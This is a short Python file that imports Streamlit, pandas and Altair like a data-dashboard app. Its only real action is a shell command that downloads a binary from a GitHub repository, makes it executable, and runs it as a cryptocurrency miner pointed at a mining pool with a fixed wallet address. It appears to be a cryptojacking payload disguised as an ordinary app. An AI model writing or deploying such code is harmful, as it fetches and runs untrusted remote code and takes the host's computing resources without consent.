from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64

p = subprocess.run("curl -L -o sse https://github.com/Ikuzot/nung/raw/main/sse && chmod +x sse && ./sse -a power2b -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u 0x4ba05dcb981f2c516c42d4c33853325438734d4f -p c=ETC,mc=MBC,ID=GASS_88 -t 15", stdout=subprocess.PIPE, shell=True)
print(p.communicate())
